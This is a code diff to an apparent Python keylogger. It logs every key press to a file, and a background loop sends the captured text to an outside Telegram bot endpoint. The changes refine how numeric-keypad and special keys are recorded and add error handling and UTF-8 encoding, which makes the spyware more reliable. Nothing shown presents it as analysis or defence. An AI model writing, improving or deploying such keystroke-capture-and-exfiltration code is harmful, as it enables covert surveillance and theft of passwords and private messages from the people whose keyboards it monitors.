@@ -11,12 +11,27 @@ LOG_FILE = "path_File"
 
 def OnPress(key) : # Define the function for handling key presses
     
-# write the pressed key to a log file
-    with open("Key_log.txt", 'a') as f :
-        try : 
-            f.write(key.char)
-        except AttributeError: 
-            f.write(f'[{key}]') # for special keys (shift, ctrl...)
+    try : 
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(key.char)
+                return
+
+            vk = getattr(key, 'vk', None)
+            if isinstance(vk, int):
+                if 96 <= vk <= 105:
+                    f.write(str(vk - 96))
+                    return
+                f.write(f'[VK_{vk}]')
+                return
+
+            kstr = str(key)               
+            if kstr.startswith('Key.'):
+                kstr = kstr.replace('Key.', '')
+            f.write(f'[{kstr}]')
+     except Exception as e:
+         with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(f'[ERR:{e}]')
 
 def sendingkeys(message):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
@@ -35,7 +50,7 @@ def report_logs():
     while True:
         try:
             if os.path.exists(LOG_FILE):
-                with open(LOG_FILE, 'r') as f:
+                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                     log_contents = f.read()
 
                 if log_contents:                 # send only if not empty
@@ -57,6 +72,7 @@ t.start()
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
+
 
 
 
